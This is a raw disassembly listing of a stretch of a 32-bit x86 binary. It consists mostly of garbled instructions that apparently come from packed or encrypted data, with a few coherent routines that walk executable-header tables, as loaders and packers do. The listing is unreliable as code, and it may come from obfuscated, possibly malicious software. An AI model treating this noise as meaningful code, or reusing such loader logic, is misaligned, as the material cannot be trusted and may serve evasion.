  40ae43:	sub    al,0xc8
  40ae45:	test   al,0xae
  40ae47:	in     al,0x81
  40ae49:	mov    bl,0x3b
  40ae4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae4c:	and    BYTE PTR [edx+0x1e],ch
  40ae4f:	mov    ah,0x0
  40ae51:	pop    edx
  40ae52:	call   0x1ead:0x3bee8c81
  40ae59:	adc    al,0xe1
  40ae5b:	push   cs
  40ae5c:	loope  0x40adeb
  40ae5e:	inc    DWORD PTR [esi+0x41]
  40ae61:	adc    edi,DWORD PTR [eax+ebx*2-0x45b5f9dd]
  40ae68:	add    edi,DWORD PTR ss:[edx-0x5a]
  40ae6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae6d:	dec    edi
  40ae6e:	or     DWORD PTR [edi],0x4e
  40ae71:	fnstsw WORD PTR [edx+edi*8+0x7c]
  40ae75:	dec    ebx
  40ae76:	(bad)  
  40ae77:	std    
  40ae78:	shld   DWORD PTR [esi-0x1c2d8c34],ecx,cl
  40ae7f:	jp     0x40ae15
  40ae81:	add    DWORD PTR [ebx],0xa94eeb0e
  40ae87:	xor    BYTE PTR gs:[ebx+ebx*1-0x1],dh
  40ae8c:	add    BYTE PTR [edi],cl
  40ae8e:	ret    
  40ae8f:	aaa    
  40ae90:	lea    edi,ds:0x31b5984a
  40ae96:	aas    
  40ae97:	xor    ah,dl
  40ae99:	sbb    bl,bl
  40ae9b:	lahf   
  40ae9c:	aaa    
  40ae9d:	lods   eax,DWORD PTR ds:[esi]
  40ae9e:	xchg   BYTE PTR [esi-0x338a4e04],cl
  40aea4:	clc    
  40aea5:	and    edx,DWORD PTR [edi-0x51]
  40aea8:	push   edi
  40aea9:	clc    
  40aeaa:	scas   eax,DWORD PTR es:[edi]
  40aeab:	outs   dx,DWORD PTR ds:[esi]
  40aeac:	loope  0x40af0f
  40aeae:	dec    ecx
  40aeaf:	xor    esp,edi
  40aeb1:	sbb    eax,0xfdc89bac
  40aeb6:	mov    ebp,0xee8f76a2
  40aebb:	out    dx,eax
  40aebc:	outs   dx,BYTE PTR ds:[esi]
  40aebd:	inc    esp
  40aebe:	push   ss
  40aebf:	xchg   ecx,eax
  40aec0:	mov    ds:0x8942bf42,al
  40aec5:	jmp    0x40aedd
  40aec7:	add    eax,0x7b9d18b1
  40aecc:	pushf  
  40aecd:	xor    eax,0x3e40a324
  40aed2:	jge    0x40af4c
  40aed4:	push   es
  40aed5:	jle    0x40aee3
  40aed7:	xor    BYTE PTR [eax+0x693bee7d],dl
  40aedd:	jecxz  0x40aea6
  40aedf:	fistp  QWORD PTR [ebp-0x56b94b8d]
  40aee5:	or     ebp,esi
  40aee7:	ds push ds
  40aee9:	dec    ecx
  40aeea:	sbb    DWORD PTR [eax],0x31
  40aeed:	test   al,0x63
  40aeef:	jno    0x40ae86
  40aef1:	cld    
  40aef2:	cli    
  40aef3:	iret   
  40aef4:	xchg   eax,edx
  40aef6:	loope  0x40aef5
  40aef8:	fs mov al,0x2c
  40aefb:	xor    eax,0x51c50244
  40af00:	mov    ah,0x8
  40af02:	sub    BYTE PTR [esi],0x7
  40af05:	cwde   
  40af06:	pop    ebx
  40af07:	(bad)  
  40af09:	enter  0x274,0xb6
  40af0d:	adc    al,0xba
  40af0f:	pop    edx
  40af10:	xchg   BYTE PTR [esp+esi*4],ch
  40af13:	mov    cl,0x7
  40af15:	and    eax,0x52c514d
  40af1a:	loop   0x40ae9f
  40af1c:	push   0x606d7316
  40af21:	cmp    dh,BYTE PTR ds:0x193438da
  40af27:	jmp    0x40af60
  40af29:	in     eax,0xe4
  40af2b:	jno    0x40af72
  40af2d:	loope  0x40af14
  40af2f:	scas   eax,DWORD PTR es:[edi]
  40af30:	or     ch,bh
  40af32:	shl    bh,1
  40af34:	cmp    ecx,esp
  40af36:	std    
  40af37:	cmp    BYTE PTR [esi+0x5c4ee16c],bl
  40af3d:	or     DWORD PTR [edi],esi
  40af3f:	pushf  
  40af40:	lea    esp,ds:0x34979df6
  40af46:	test   eax,0xba49d862
  40af4b:	mov    edi,0xbfc3589d
  40af50:	cmp    ebp,ecx
  40af52:	cli    
  40af53:	push   eax
  40af54:	call   0x44de:0x216ad0ba
  40af5b:	adc    al,0x3
  40af5d:	xor    BYTE PTR [esi-0x4a],dh
  40af60:	mov    edi,0xed4ab31e
  40af65:	lock cmp al,0x2b
  40af68:	add    al,BYTE PTR [ebp-0x27bac80c]
  40af6e:	sub    al,0x75
  40af70:	sbb    DWORD PTR [ebx-0x367ee7c0],ecx
  40af76:	sbb    BYTE PTR [eax+0x0],dh
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4336a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43365f
  40af93:	sub    DWORD PTR ds:0x43360f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43365b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43365b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43365b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43365b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43365b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43365b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43365b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43365b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4336a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	dec    DWORD PTR [esi]
  40b019:	cmp    al,0x19
  40b01b:	idiv   DWORD PTR fs:[esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	(bad)  
  40b025:	outs   dx,BYTE PTR ds:[esi]
  40b026:	fs addr16 cmc 
  40b029:	mov    edi,0x3e8a754d
  40b02e:	clc    
  40b02f:	das    
  40b030:	or     eax,0x610a5ca6
  40b035:	lock fst DWORD PTR [eax-0x64]
  40b039:	push   esp
  40b03a:	addr16 inc ebx
  40b03c:	sti    
  40b03d:	mov    ebx,0x97f3b386
  40b042:	lahf   
  40b043:	out    dx,eax
  40b044:	xchg   ecx,eax
  40b045:	jbe    0x40b05e
  40b047:	xor    BYTE PTR [edx],al
  40b049:	jge    0x40b06f
  40b04b:	xchg   edx,eax
  40b04c:	js     0x40b005
  40b04e:	push   ds
  40b04f:	pop    ebx
  40b050:	xchg   DWORD PTR [ebp-0x5af34d6b],edx
  40b056:	mov    ch,0x78
  40b058:	xor    edx,DWORD PTR [eax-0x33]
  40b05b:	xchg   esp,eax
  40b05c:	std    
  40b05d:	es shr cl,0xd6
  40b061:	xchg   DWORD PTR [edi+0x58],ebx
  40b064:	xchg   ecx,eax
  40b065:	pop    ebp
  40b066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b067:	icebp  
  40b068:	iret   
  40b069:	push   ebp
  40b06a:	aas    
  40b06b:	jo     0x40b017
  40b06d:	aas    
  40b06e:	pop    edx
  40b06f:	loop   0x40b02f
  40b071:	mov    al,ds:0x5c12e822
  40b076:	sbb    eax,0xf9418207
  40b07b:	cwde   
  40b07c:	and    ecx,DWORD PTR [edx]
  40b07e:	mov    ebp,0x18c92c50
  40b083:	sub    ebx,DWORD PTR [eax]
  40b085:	xchg   ebx,eax
  40b086:	mov    ch,0x28
  40b088:	inc    ebp
  40b089:	pop    ebp
  40b08a:	(bad)  
  40b08b:	loop   0x40b0bd
  40b08d:	daa    
  40b08e:	loop   0x40b0c6
  40b090:	out    dx,al
  40b091:	or     esi,esp
  40b093:	cwde   
  40b094:	loopne 0x40b080
  40b096:	fnstcw WORD PTR [ebx-0x3b37cac]
  40b09c:	int    0xcf
  40b09e:	js     0x40b080
  40b0a0:	xchg   BYTE PTR [edx+0x48e69d92],cl
  40b0a6:	call   0x866e25e1
  40b0ab:	pop    ebp
  40b0ac:	daa    
  40b0ad:	xor    eax,0x2ae1d02f
  40b0b2:	mov    eax,ds:0x83c8d2da
  40b0b7:	ret    
  40b0b8:	bound  esi,QWORD PTR [eax-0x2f972300]
  40b0be:	add    dh,BYTE PTR [ecx+0x33776498]
  40b0c4:	mov    DWORD PTR [esi+0x66809f9a],eax
  40b0ca:	pop    ds
  40b0cb:	(bad)  
  40b0cc:	(bad)  
  40b0cd:	pop    esp
  40b0ce:	pop    ecx
  40b0cf:	xchg   edi,eax
  40b0d0:	pop    ecx
  40b0d1:	clc    
  40b0d2:	pusha  
  40b0d3:	xchg   DWORD PTR [eax+0x1e],edi
  40b0d6:	mov    edx,0x72cf9097
  40b0db:	mov    ch,0x3e
  40b0dd:	pop    eax
  40b0de:	dec    eax
  40b0df:	sti    
  40b0e0:	lds    esp,FWORD PTR [esi+0x75ab3682]
  40b0e6:	(bad)  
  40b0e7:	in     al,dx
  40b0e8:	xchg   edx,eax
  40b0e9:	fidiv  WORD PTR [ebx]
  40b0eb:	rol    ebx,1
  40b0ed:	int    0xbf
  40b0ef:	and    al,0xe
  40b0f1:	sbb    DWORD PTR [ecx],esp
  40b0f3:	jp     0x40b0ef
  40b0f5:	icebp  
  40b0f6:	pop    edx
  40b0f7:	icebp  
  40b0f8:	or     al,0x20
  40b0fa:	pusha  
  40b0fb:	push   ecx
  40b0fc:	push   ebp
  40b0fd:	adc    DWORD PTR [edx+edi*2],0x51
  40b101:	xabort 0x6f
  40b104:	int    0x92
  40b106:	jmp    0x365d:0xfff9d421
  40b10d:	mov    WORD PTR [ecx],?
  40b10f:	out    0x3f,eax
  40b111:	imul   esi,DWORD PTR [esp+eax*2+0x53],0xffffffa8
  40b116:	mov    dh,0x11
  40b118:	add    DWORD PTR [edi+ecx*1-0x47d57c99],ebp
  40b11f:	ret    0x53fe
  40b122:	pop    es
  40b123:	stos   BYTE PTR es:[edi],al
  40b124:	xchg   esp,ecx
  40b126:	add    eax,0x61f33753
  40b12b:	mov    ch,0x87
  40b12d:	inc    edx
  40b12e:	je     0x40b17a
  40b130:	ror    dh,1
  40b132:	sub    BYTE PTR [ecx+0x414cc8dc],bl
  40b138:	xor    ah,BYTE PTR [ecx+0x7f]
  40b13b:	pop    ss
  40b13c:	inc    edi
  40b13d:	(bad)  
  40b13e:	pop    esi
  40b13f:	add    eax,0x46b1acaf
  40b144:	not    ch
  40b146:	ret    0x56a6
  40b149:	or     BYTE PTR [ebx-0x2cf7a21c],cl
  40b14f:	inc    edx
  40b150:	clc    
  40b151:	xchg   ebp,eax
  40b152:	inc    edi
  40b153:	lods   al,BYTE PTR ds:[esi]
  40b154:	mov    al,0x7f
  40b156:	loop   0x40b105
  40b158:	repz mov dh,0xe6
  40b15b:	add    al,BYTE PTR [edx]
  40b15d:	pop    eax
  40b15e:	sbb    eax,0xea9ef1cc
  40b163:	mov    edi,0x6ed7842c
  40b168:	pushf  
  40b169:	popa   
  40b16a:	(bad)  
  40b16b:	loop   0x40b1c3
  40b16d:	cwde   
  40b16e:	mov    esi,fs
  40b170:	or     eax,0xdd8e3b1c
  40b175:	mov    dh,0x43
  40b177:	sub    ebp,DWORD PTR [edx]
  40b179:	xchg   edi,eax
  40b17a:	sbb    ecx,DWORD PTR [esi]
  40b17c:	dec    BYTE PTR [ebx-0x1af6251e]
  40b182:	je     0x40b1ae
  40b184:	(bad)  
  40b186:	mov    eax,ds:0x8be21ae1
  40b18b:	xchg   ecx,eax
  40b18c:	cli    
  40b18d:	jmp    0x40b200
  40b18f:	push   es
  40b190:	lds    esi,FWORD PTR [eax]
  40b192:	lea    esp,[edi+esi*2]
  40b195:	sub    al,0xe9
  40b197:	jp     0x40b1bb
  40b199:	xchg   ebp,eax
  40b19a:	imul   esp,DWORD PTR [eax-0x71eedccb],0xd5a4cf76
  40b1a4:	adc    DWORD PTR [eax+esi*1-0x41],ebp
  40b1a8:	loope  0x40b1b4
  40b1aa:	icebp  
  40b1ab:	test   BYTE PTR [edi+0x1c502182],0x93
  40b1b2:	jbe    0x40b1f9
  40b1b4:	inc    esp
  40b1b5:	loop   0x40b1e1
  40b1b7:	pushf  
  40b1b8:	dec    ebx
  40b1b9:	mov    bh,0xf2
  40b1bb:	(bad)  
  40b1bc:	les    edi,FWORD PTR [ecx-0xf]
  40b1bf:	mov    bl,0x30
  40b1c1:	cli    
  40b1c2:	xchg   esp,eax
  40b1c3:	scas   eax,DWORD PTR es:[edi]
  40b1c4:	lock adc bl,al
  40b1c7:	rcr    DWORD PTR [ecx+0x54336e45],cl
  40b1cd:	inc    ecx
  40b1ce:	xchg   esi,eax
  40b1cf:	ja     0x40b191
  40b1d1:	scas   al,BYTE PTR es:[edi]
  40b1d2:	je     0x40b23d
  40b1d4:	xor    BYTE PTR [ebp+edx*4+0x46],dl
  40b1d8:	pop    ebp
  40b1d9:	sbb    eax,0x323805e
  40b1de:	mov    ecx,0xae43f8df
  40b1e3:	stc    
  40b1e4:	inc    edi
  40b1e5:	leave  
  40b1e6:	pop    edi
  40b1e7:	mov    edi,0x32347060
  40b1ec:	fist   DWORD PTR [eax-0x34]
  40b1ef:	mov    WORD PTR [esi+edi*1-0x583ed6f8],es
  40b1f6:	xor    eax,0x5e90d6a1
  40b1fb:	pop    ecx
  40b1fc:	pop    ebx
  40b1fd:	xchg   ecx,eax
  40b1fe:	aad    0x97
  40b200:	into   
  40b201:	mov    ebx,0x1a7abf39
  40b206:	pop    ecx
  40b207:	aaa    
  40b208:	lahf   
  40b209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b20a:	ja     0x40b239
  40b20c:	and    BYTE PTR [ebp-0x58744661],dl
  40b212:	or     al,0x59
  40b214:	sbb    BYTE PTR [esi-0x3fe0e1b7],dh
  40b21a:	jmp    FWORD PTR [ebp-0x64084642]
  40b220:	xchg   ebp,eax
  40b221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b222:	jge    0x40b1cd
  40b224:	cmp    BYTE PTR [ebp-0x5121afba],bh
  40b22a:	les    esp,FWORD PTR [edx]
  40b22c:	sub    edi,ebp
  40b22e:	push   ecx
  40b22f:	inc    esi
  40b230:	dec    ebp
  40b231:	inc    ebx
  40b232:	jle    0x40b247
  40b234:	inc    edi
  40b235:	add    bl,cl
  40b237:	mov    edx,0x63bf18c2
  40b23c:	sahf   
  40b23d:	jo     0x40b20f
  40b23f:	(bad)  
  40b240:	mov    esp,0xf568f304
  40b245:	jnp    0x40b24f
  40b247:	mov    edi,0x9c5551b
  40b24c:	adc    cl,BYTE PTR [eax]
  40b24e:	fwait
  40b24f:	add    DWORD PTR [edx-0xc9ee73d],eax
  40b255:	xchg   dx,ax
  40b257:	call   0xfbbc2334
  40b25c:	(bad)  
  40b25d:	in     al,0xec
  40b25f:	aad    0x48
  40b261:	mov    bl,0x49
  40b263:	lahf   
  40b264:	mov    eax,0xc811a118
  40b269:	mov    eax,DWORD PTR [ebp-0x14]
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	push   edx
  40b284:	stc    
  40b285:	scas   al,BYTE PTR es:[edi]
  40b286:	mov    bh,0x2e
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	nop
  40b290:	inc    esp
  40b291:	not    BYTE PTR [edi+0x5e]
  40b294:	repz xchg edi,eax
  40b296:	(bad)  
  40b297:	or     al,0xc4
  40b299:	xchg   ebx,ecx
  40b29b:	scas   eax,DWORD PTR es:[edi]
  40b29c:	int3   
  40b29d:	retf   
  40b29e:	cdq    
  40b29f:	cmp    al,0x9e
  40b2a1:	aas    
  40b2a2:	mov    eax,0x85a1baa0
  40b2a7:	cmp    al,0x32
  40b2a9:	mov    dl,0xe0
  40b2ab:	mov    al,ds:0xab9d1341
  40b2b0:	int3   
  40b2b1:	lock jmp 0x1c0607a7
  40b2b7:	pop    esp
  40b2b8:	cli    
  40b2b9:	push   ds
  40b2ba:	mov    bl,0x92
  40b2bc:	sub    BYTE PTR [ebp+eiz*2+0x55782b00],cl
  40b2c3:	or     ah,bl
  40b2c5:	outs   dx,DWORD PTR ds:[esi]
  40b2c6:	mov    ebp,cs
  40b2c8:	shl    BYTE PTR [edi+0x74f4d58d],0x47
  40b2cf:	mov    al,ds:0x3d389998
  40b2d4:	sbb    eax,0x2d0cbd1f
  40b2d9:	or     ah,BYTE PTR [eax-0x119d160c]
  40b2df:	out    0xac,eax
  40b2e1:	cli    
  40b2e2:	pop    ecx
  40b2e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2e4:	idiv   ah
  40b2e6:	fcmove st,st(3)
  40b2e8:	gs (bad) 
  40b2ea:	add    BYTE PTR [eax+0x3d],ch
  40b2ed:	cmc    
  40b2ee:	mov    ebp,0x8118839f
  40b2f3:	add    bh,0x8
  40b2f6:	inc    ebp
  40b2f7:	mov    edx,DWORD PTR [esi]
  40b2f9:	xor    al,0x1a
  40b2fb:	mov    dh,0x3f
  40b2fd:	leave  
  40b2fe:	stos   DWORD PTR es:[edi],eax
  40b2ff:	(bad)  
  40b300:	add    edi,DWORD PTR ds:[esi+ebp*1-0x6df2c6e8]
  40b308:	std    
  40b309:	and    eax,0x342ed9e2
  40b30e:	push   ecx
  40b30f:	xchg   ebx,eax
  40b310:	inc    eax
  40b311:	push   0xffffffec
  40b313:	(bad)  
  40b315:	repz jge 0x40b2de
  40b318:	jmp    0x3f35612a
  40b31d:	cmp    cl,BYTE PTR [eax]
  40b31f:	int    0xc0
  40b321:	sbb    DWORD PTR [ebx+ebx*1],0x7d
  40b325:	enter  0xf9af,0xc1
  40b329:	push   ss
  40b32a:	push   edi
  40b32b:	jmp    0xf760:0x457dd8e
  40b332:	repz xor eax,0x8ccb751b
  40b338:	(bad)  
  40b339:	xor    al,0x7
  40b33b:	xor    eax,0xb34d931f
  40b340:	repnz xchg ebx,eax
  40b342:	daa    
  40b343:	loope  0x40b33f
  40b345:	adc    DWORD PTR [edi+0x57],ebp
  40b348:	(bad)
  40b34c:	xchg   esp,eax
  40b34d:	nop
  40b34e:	xchg   BYTE PTR [eax-0x6d5f1867],al
  40b354:	aam    0xb0
  40b356:	adc    edi,DWORD PTR [esp+eiz*2-0x2a]
  40b35a:	xor    BYTE PTR [ecx],ah
  40b35c:	add    bl,BYTE PTR [eax]
  40b35e:	jle    0x40b303
  40b360:	lods   al,BYTE PTR ds:[esi]
  40b361:	icebp  
  40b362:	jp     0x40b2e9
  40b364:	std    
  40b365:	xor    DWORD PTR [edx+0x380d6334],edi
  40b36b:	(bad)  
  40b36c:	das    
  40b36d:	xchg   DWORD PTR [ebx-0x51],ebp
  40b370:	push   ebx
  40b371:	inc    ebx
  40b372:	sub    bh,0x37
  40b375:	and    eax,0x32d15926
  40b37a:	icebp  
  40b37b:	push   cs
  40b37c:	push   ss
  40b37d:	aaa    
  40b37e:	in     al,dx
  40b37f:	mov    ch,0xac
  40b381:	jmp    0xf911953b
  40b386:	push   ecx
  40b388:	lock imul esi,ebx,0x40
  40b38c:	cmp    al,dl
  40b38e:	pop    edi
  40b38f:	lods   al,BYTE PTR ds:[esi]
  40b390:	sub    BYTE PTR [edx-0x2c],al
  40b393:	mov    ds:0x89d83bba,al
  40b398:	gs (bad) 
  40b39a:	bound  ebp,QWORD PTR [edx+ecx*4-0x7ffed458]
  40b3a1:	sbb    eax,0xb1828ad5
  40b3a6:	or     ecx,edi
  40b3a8:	lahf   
  40b3a9:	jno    0x40b3f5
  40b3ab:	popa   
  40b3ac:	fsubr  QWORD PTR [esi-0x6b6ec7bc]
  40b3b2:	fldenv [ebx+0x6e353292]
  40b3b8:	lock cdq 
  40b3ba:	adc    DWORD PTR [ebx*8+0xcde3dd4],eax
  40b3c1:	mov    bh,0x86
  40b3c3:	jge    0x40b3a6
  40b3c5:	xor    DWORD PTR [eax+0xd],0x4badbaec
  40b3cc:	add    BYTE PTR [edx+0x5a],dl
  40b3cf:	inc    edx
  40b3d0:	cli    
  40b3d1:	push   ss
  40b3d2:	jae    0x40b3be
  40b3d4:	sub    al,0x3b
  40b3d6:	sbb    eax,0x36634225
  40b3db:	xchg   edi,eax
  40b3dc:	call   0xf173f4e
  40b3e1:	jg     0x40b3c4
  40b3e3:	pop    ebp
  40b3e4:	jle    0x40b3e3
  40b3e6:	pop    esi
  40b3e7:	jb     0x40b438
  40b3e9:	sbb    al,0x7d
  40b3eb:	mov    esp,0x3e1a4da0
  40b3f0:	(bad)  
  40b3f1:	retf   
  40b3f2:	mov    edx,0xaba7176b
  40b3f7:	dec    esp
  40b3f8:	mov    esp,0x3b5d663b
  40b3fd:	add    DWORD PTR [edi],edi
  40b3ff:	sbb    DWORD PTR [ebp+0x6b],edi
  40b402:	cmp    ebx,edi
  40b404:	dec    edx
  40b405:	ins    BYTE PTR es:[edi],dx
  40b406:	lahf   
  40b407:	mov    dh,0x4e
  40b409:	push   esp
  40b40a:	daa    
  40b40b:	xchg   ebp,eax
  40b40c:	lock pop edx
  40b40e:	ret    0x9f3a
  40b411:	inc    ebp
  40b412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b413:	leave  
  40b414:	sbb    DWORD PTR [ecx],esp
  40b416:	jl     0x40b457
  40b418:	xchg   edi,eax
  40b419:	sbb    eax,0xbdaf0aeb
  40b41e:	lea    esi,[edi+0x68]
  40b421:	inc    ebx
  40b422:	dec    esp
  40b423:	adc    al,0x13
  40b425:	jle    0x40b412
  40b427:	das    
  40b428:	xor    DWORD PTR [ebx-0x1e],esp
  40b42b:	data16 cmp dl,ah
  40b42e:	(bad)  
  40b42f:	and    al,0xb6
  40b431:	jmp    0xabbd7281
  40b436:	add    dl,bh
  40b438:	inc    ebp
  40b439:	jno    0x40b44b
  40b43b:	xchg   BYTE PTR [edi],dl
  40b43d:	mov    ecx,0xebecf5eb
  40b442:	inc    ebp
  40b443:	repz jns 0x40b3c9
  40b446:	sub    eax,0xd1171594
  40b44b:	sti    
  40b44c:	add    BYTE PTR [eax-0x6a],ch
  40b44f:	and    al,0x52
  40b451:	aam    0xe1
  40b453:	adc    ah,BYTE PTR [edx+ecx*4+0x77]
  40b457:	pop    edx
  40b458:	addr16 push ebx
  40b45a:	push   ss
  40b45b:	sbb    al,0xba
  40b45d:	lahf   
  40b45e:	push   esi
  40b45f:	xor    dh,BYTE PTR [ebx+0x45b53ccc]
  40b465:	jge    0x40b4d8
  40b467:	sti    
  40b468:	sub    esp,DWORD PTR [ebx+0x2eb33ae0]
  40b46e:	xor    ah,ch
  40b470:	mov    dh,0x7f
  40b472:	and    dl,al
  40b474:	imul   esp
  40b476:	out    0x7a,eax
  40b478:	or     al,bl
  40b47a:	(bad)  
  40b47c:	jp     0x40b49d
  40b47e:	std    
  40b47f:	mov    ecx,0x24792802
  40b484:	dec    eax
  40b485:	push   0xffffff80
  40b487:	out    dx,al
  40b488:	cld    
  40b489:	or     ebx,DWORD PTR [eax-0x3e]
  40b48c:	adc    eax,0xeac7768
  40b491:	test   BYTE PTR [edi],0xa
  40b494:	jle    0x40b43f
  40b496:	pop    ebx
  40b497:	jmp    FWORD PTR [ecx]
  40b499:	fwait
  40b49a:	pavgw  mm4,QWORD PTR [esi+0x60]
  40b49e:	cs jbe 0x40b4cc
  40b4a1:	sub    eax,0xc38dc98e
  40b4a6:	or     DWORD PTR [edi-0x1d06406b],eax
  40b4ac:	mov    edi,0x61a58f83
  40b4b1:	test   bl,cl
  40b4b3:	test   DWORD PTR [edi+0x145d88e8],edi
  40b4b9:	push   0xf4825185
  40b4be:	jp     0x40b490
  40b4c0:	outs   dx,BYTE PTR ds:[esi]
  40b4c1:	mov    edx,0x8a51abec
  40b4c6:	cwde   
  40b4c7:	inc    ebx
  40b4c8:	jb     0x40b4da
  40b4ca:	xchg   ecx,eax
  40b4cb:	mov    dl,0x89
  40b4cd:	data16 cli 
  40b4cf:	push   ecx
  40b4d0:	aaa    
  40b4d1:	and    ch,BYTE PTR [edx+ebp*4-0x16]
  40b4d5:	mov    DWORD PTR [ebp-0x2c],ecx
  40b4d8:	mov    eax,DWORD PTR [ebp-0x14]
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	int3   
  40b508:	add    esp,edx
  40b50a:	pop    edx
  40b50b:	call   0x38bf3400
  40b510:	jl     0x40b590
  40b512:	jle    0x40b4a9
  40b514:	dec    edi
  40b515:	nop
  40b516:	push   ebx
  40b517:	and    al,0x16
  40b519:	xor    al,0x57
  40b51b:	adc    BYTE PTR [eax+0x5b],dh
  40b51e:	mov    al,0x65
  40b520:	push   0xffffffbb
  40b522:	xor    esp,ecx
  40b524:	xchg   DWORD PTR [edi+0x30],edi
  40b527:	cwde   
  40b528:	in     eax,0xf7
  40b52a:	pop    ds
  40b52b:	mov    fs,WORD PTR [eax]
  40b52d:	pop    ds
  40b52e:	loopne 0x40b5a3
  40b530:	mov    ?,eax
  40b532:	xlat   BYTE PTR ds:[ebx]
  40b533:	dec    esp
  40b534:	icebp  
  40b535:	ins    BYTE PTR es:[edi],dx
  40b536:	neg    DWORD PTR [eax-0x469f2f03]
  40b53c:	enter  0xc968,0x88
  40b540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b541:	shl    BYTE PTR [eax-0x26],0x9c
  40b545:	test   DWORD PTR [esi+0x45e40fa5],esp
  40b54b:	mov    WORD PTR [eax+ebx*4],es
  40b54e:	shr    DWORD PTR [ecx+0x1929dda1],0x40
  40b555:	shl    BYTE PTR cs:[ebp+0x5],0x2
  40b55a:	mov    DWORD PTR [ebp+0x18d57cfd],edx
  40b560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b561:	fwait
  40b562:	(bad)  
  40b563:	lods   eax,DWORD PTR ds:[esi]
  40b564:	dec    eax
  40b565:	(bad)  
  40b566:	mov    eax,0x1b57ffd9
  40b56b:	popf   
  40b56c:	fimul  WORD PTR [ebx+0x27]
  40b56f:	fld    DWORD PTR [eax+0x545e8a13]
  40b575:	push   ecx
  40b576:	iret   
  40b577:	mov    esp,DWORD PTR [edi-0x23]
  40b57a:	inc    ecx
  40b57b:	in     eax,0x4f
  40b57d:	xchg   BYTE PTR [esi-0x82ea02c],bl
  40b583:	pop    ecx
  40b584:	mov    al,ds:0x815b89c0
  40b589:	sub    eax,0x1bac5986
  40b58e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b58f:	add    dh,BYTE PTR [ebp-0x6e]
  40b592:	lods   al,BYTE PTR ds:[esi]
  40b593:	cli    
  40b594:	mov    ?,ebp
  40b596:	(bad)  
  40b597:	mov    edx,?
  40b599:	or     ebp,DWORD PTR [ebx]
  40b59b:	mul    esp
  40b59d:	arpl   ax,bx
  40b59f:	xchg   ecx,eax
  40b5a0:	adc    eax,0x9d1bf4b6
  40b5a5:	adc    eax,0x34e01cb3
  40b5aa:	(bad)  
  40b5ab:	push   DWORD PTR [eax-0x7e21396f]
  40b5b1:	mov    ah,0xc2
  40b5b3:	sub    BYTE PTR [ebp-0x5f713b96],bl
  40b5b9:	out    dx,eax
  40b5ba:	jle    0x40b56b
  40b5bc:	fisub  WORD PTR [ecx]
  40b5be:	sbb    eax,0x98f0ae99
  40b5c3:	xor    al,dh
  40b5c5:	lods   al,BYTE PTR ss:[esi]
  40b5c7:	ins    BYTE PTR es:[edi],dx
  40b5c8:	mov    bl,0x4d
  40b5ca:	call   0x18a12ff2
  40b5cf:	add    eax,0xf0be1725
  40b5d4:	je     0x40b63e
  40b5d6:	mov    al,0x91
  40b5d8:	mov    eax,ds:0x72ef332f
  40b5dd:	sbb    eax,0x4b049eb8
  40b5e2:	inc    ebx
  40b5e3:	cs out 0x7b,al
  40b5e6:	lahf   
  40b5e7:	push   eax
  40b5e8:	jg     0x40b594
  40b5ea:	sub    al,0xbf
  40b5ec:	(bad)  
  40b5ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5ee:	xchg   edx,eax
  40b5ef:	call   0xdd203d79
  40b5f4:	or     eax,0x49a9f385
  40b5f9:	out    0xbd,al
  40b5fb:	push   ds
  40b5fc:	or     al,BYTE PTR ds:[ebp+0x22b90a0e]
  40b603:	cwde   
  40b604:	out    0x27,eax
  40b606:	mov    ecx,eax
